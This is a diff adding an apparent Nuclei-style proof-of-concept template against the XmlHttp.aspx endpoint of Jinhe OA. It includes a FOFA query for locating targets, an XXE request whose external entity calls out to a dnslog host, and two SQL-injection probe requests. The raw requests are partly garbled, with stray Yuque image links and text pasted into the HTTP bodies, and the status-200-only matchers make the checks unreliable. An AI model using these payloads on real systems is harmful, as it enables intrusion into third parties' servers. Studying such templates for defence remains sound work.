@@ -1,0 +1,75 @@
+id: poc-2271996922
+info:
+  name: 金和OA JHSoft.Web.Departments XmlHttp.aspx 存在XXE和SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,xxe,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
+
+    %remote;]>
+
+    <root/>
+
+
+    注入'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <root>
+
+    <Flag>GetSubDeptsByID</Flag>
+
+    <deptid>SQLI_POC</deptid>
+
+    </root>
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1773028403160-0d020aeb-c84e-49f3-a4b6-607818fd4d90.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <root>
+
+    <Flag>IsCompany</Flag>
+
+    <deptid>SQLI_POC</deptid>
+
+    </root>
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1773028403393-1c6d087d-aabe-4d6b-a797-4ac5a183aaf0.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
